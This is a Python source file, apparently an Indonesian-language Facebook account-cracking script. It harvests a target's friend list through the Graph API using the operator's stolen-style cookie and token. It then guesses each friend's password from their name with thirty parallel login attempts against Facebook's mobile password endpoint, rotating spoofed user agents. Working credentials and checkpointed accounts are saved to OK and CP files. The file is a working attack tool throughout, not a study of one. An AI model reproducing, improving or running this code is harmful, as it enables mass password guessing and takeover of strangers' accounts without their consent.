import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import print as cetak
from rich.columns import Columns as col
from rich import print as prints
from rich import pretty
from rich.text import Text as tekz
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

warna_kuning='#FFFF00'
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
proxxy=[]
cokbrut=[]
ses=requests.Session()
princp=[]

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku) 
	###----------[ User Agent Linux ]---------- ###
    aa='Mozilla/5.0 (X11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Linux x86_64)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(1000):
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android 12; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 wkbrowser 5.0.17 {str(rr(2111111,2999999))} js 5.1.1 newfocus lng=ru"
    empat  = f"Mozilla/5.0 (Linux; Android 9{str(rr(7,12))}; RMX1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    lima  = f"Mozilla/5.0 (Linux; Android 12{str(rr(7,12))}; IN2013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    UserAgentss = str(rc([satu,dua,tiga,empat,lima]))
    ugen.append(UserAgentss)
try:
    url_proxy = random.choice([
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
])
except:pass
   
#------------------[ PROXIES ]-------------------#
try:
    url = requests.get(f"{url_proxy}").text
    for ikfar in url.splitlines():proxxy.append(ikfar)
except requests.exceptions.ConnectionError:
   prints(nel(f"{P2}Anda Tidak Terhubung Ke Internet, Silahkan Periksa Koneksi Internet Anda",width=80,padding=(0,2),style=f"{warna_kuning}"));exit()

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P = '\x1b[0;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[0;91m' #RED +
k = '\033[33m' # KUNING +
hhhh = '\x1b[1;92m' # HIJAU +
h = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[0;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
        
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 

def hyper(ski):
        for e in ski + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
		
def hyper_ski():
	print(f'''{asu}
     dBP dBP dBP dBP dBBBBBb  dBBBP dBBBBBb
                dBP      dB'            dBP
   dBBBBBP     dBP   dBBBP' dBBP    dBBBBK 
  dBP dBP     dBP   dBP    dBP     dBP  BB 
 dBP dBP     dBP   dBP    dBBBBP  dBP  dB' 
       ''')
def clear():
	os.system('clear')
def back():
	login()
	
def banner():
	clear()
	prints(nel(f"{P2}Selamat Datang Masbro, Jangan Lupa Subscribe Channel Saya :) ",width=80,padding=(0,2),style=f"{warna_kuning}"))
	time.sleep(2)
	os.system('xdg-open https://www.youtube.com/@hyperski')
       
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			reload_login()
		except requests.exceptions.ConnectionError:
			print('{m}*{P} Internet Error')
			exit()
	except IOError:
		reload_login()
def reload_login():
	try:
		banner()
		os.system('clear')
		ses = requests.Session()
		hyper_ski()
		hyper(f'{k}[{x}!{k}]{x} Masukkan Cookies Facebook Masbro ! ')
		cookie = input(f'{k} ╰─{x} Cookies : ')
		if cookie == '':
			print(f'\n{k}[{x}!{k}]{x} Jangan Kosong')
			time.sleep(3)
			reload_login()
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		print(f'\n{h}[{x}✓{h}]{x} Login Berhasil\n    Ketik {k}python run.py')
		
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'\n{k}[{x}!{k}] {x}Login Gagal\n{k}[{x}!{k}]{x} Pastikan Cookies Benar !')
		exit()
def menu(my_name,my_id):
	os.system('clear')
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(f'{M}* Login Gagal')
		reload_login()
	hyper_ski()
	print(f'{k}[{x} Menu {k}/{x} Fitur {k}]')
	print(f'╰─{k}[{x}1{k}] {x}Hack Random Publik\n  {k}[{x}2{k}] {x}Hasil\n  {k}[{x}3{k}]{x} Pengaturan\n  {k}[{x}4{k}]{x} Keluar')
	Skyler = input(f'{k}   ╰─ {x}Pilih : ')
	print('')
	if Skyler in ['1']:
		dump_publik()
		mie()
		#setting()
	elif Skyler in ['2']:
		result()
	elif Skyler in ['3']:
		pengaturan()
	elif Skyler in ['4']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		exit()
	else:
		print(f'{m}[{x}!{m}]{x} Pilihan Tidak Tepat')
		back()

def pengaturan():
	os.system('clear')
	hyper_ski()
	print(f'{k}[ {x}Menu Pengaturan {k}]')
	print(f'{b}╰─{b}[{x}1{b}] {x}Ganti User Agent\n  {b}[{x}2{b}] {x}Update Script\n  {b}[{x}3{b}]{x} Kembali')
	ugent=str(input(f'{b}   ╰─ {x}Pilih : '))
	if ugent == '':
		back()
	elif ugent == '1' or ugent == '01':
		try:os.mkdir('UA')
		except:pass
		uamu=str(input(f'\n{k}[{x}!{k}] {x}Masukkan UserAgentmu\n{b} ╰─ {x}UserAgent : '))
		if uamu in ['']:
			back()
		try:
			open('UA/user-agent.txt','w').write(uamu)
		except:
			pass
	elif ugent == '2' or ugent == '02':
		print(f'\n{k}[{x}!{k}] {x}Maaf Saat Ini Script Belum Bisa Di Update Karena Lagi Tahap Pembuatan')
		time.sleep(3)
		back()
	elif ugent == '3' or ugent == '03':
		back()
	else:
		exit()
def error():
	print(f'╰─ Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()

def dump_publik():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	os.system('clear')
	hyper_ski()
	print(f'{k}[{x}!{k}]{x} Masukkan ID Publik Contoh {kk}1000****40{x},{k}me')
	pil=input(f'{k} ╰─ {x}ID Publik : ')
	try:
		ussr=requests.get(f'https://graph.facebook.com/{pil}?fields=name&access_token=%s'%(tokenku[0]),cookies={'cookie':kukis})
		aku=json.loads(ussr.text)
		im=aku['name']
		print(f'\n{k}[{x}!{k}]{x} Nama {k}{im} Gblk')
	except:pass
	try:
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'{k} ╰─ {x}Jumlah ID {k}{str(len(id))}')
		new=[]
		for ski in sorted(id):
			new.append(ski)
		abc=len(new)
		abcd=(abc-1)
		for rank in range(abc):
			id2.append(new[abcd])
			abcd-=1
		method.append('mobile')
		time.sleep(2)
		
	except requests.exceptions.ConnectionError:
		print('{m} ╰─ Kesalahan Sambungan')
		exit()
	except (KeyError,IOError):
		print(f'{m} ╰─ {x}ID Error')
		exit()
		
def result():
	os.system('clear')
	hyper_ski()
	print(f'{k}[ {x}Menu Hasil {k} ]')
	print(f'{b}╰─[{x}1{b}] {x}Hasil Akun OK\n  {b}[{x}2{b}] {x}Hasil Akun Sesi\n  {b}[{x}3{b}] {x}Kembali')
	kz = input(f'{b}   ╰─ {x}Pilih : ')
	print('')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('\n[!] Tidak Ada Hasil')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{b}[{x}{nom}{b}] {x}{isi}\n{b} ╰─ {x}Total Ada {b}{str(len(hem))} {x}Akun')
				else:
					lol.update({str(cih):str(isi)})
					print(f'{b}[{x}{str(cih)}{b}] {x}{isi}\n{b} ╰─ {x}Total Ada {b}{str(len(hem))} {x}Akun')
			geeh = input(f'\n{b}[{x}!{b}] {x}Pilih : ')
			os.system('clear')
			time.sleep(2)
			try:geh = lol[geeh]
			except KeyError:
				print(f'{b} ╰─ {x}Pilihan {geeh} Tidak Ada')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f'{b} ╰─{x} File Kosong')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				hyper_ski()
				print(f'{k}{cpkuni[0]}{x}|{k}{cpkuni[1]}')
				nocp +=1
			input(f'\n{b}[ {x}ENTER {b}]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f'{b} ╰─{x} File Kosong')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f'{k}[{x}!{k}]{x} Belum Ada Hasil OK')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					#print(''+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
					print(f'{b}[{x}{nom}{b}] {x}{isi}\n{b} ╰─ {x}Total Ada {b}{str(len(hem))} {x}Akun')
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
			geeh = input(f'\n{b}[{x}!{b}] {x}Pilih : ')
			os.system('clear')
			try:geh = lol[geeh]
			except KeyError:
				print(f'{b} ╰─ {x}Pilihan {geeh} Tidak Ada')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f'{b} ╰─{x} File Kosong')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				hyper_ski()
				print(f'{h}{cpkuni[0]}{x}|{h}{cpkuni[1]}')
				nocp +=1
			input(f'\n{b}[ {x}ENTER{k} ]')
			back()
	elif kz in ['3','03']:
		back()
	else:
		exit()

def crack_file():
	try:vin = os.listdir('DUMP')
	except FileNotFoundError:
		print('╰─ File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('╰─ Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f' %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('╰─ %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n╰─ Chouse : ')
		print('')
		try:geh = lol[geeh]
		except KeyError:
			print(f'╰─{k} Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('DUMP/'+geh,'r').read().splitlines()
		except:
			print('╰─ File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()

def mie():
	global prog,des
	print(f'\n{k}[{x}!{k}]{x} Mainkan {k}Mode Pesawat{x} 5 Detik\n    Jika Tidak Ada Hasil\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
		print(f'{k}[{x}!{k}]{x} Hasil Tersimpan Di File OK{k}/{x}CP')
		exit()

def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}[/] [yellow]CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	try:ua=open('UA/user-agent.txt','r').read()
	except:ua='Mozilla/5.0 (Linux; Android 10; Infinix X657C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36'
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'{k}[{x}!{k}] {x}User : {k}{idf}\n    {x}Pass : {k}{pw}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'{h}[{x}✓{h}] {x}User : {h}{idf}\n    {x}Pass : {h}{pw}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
      
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()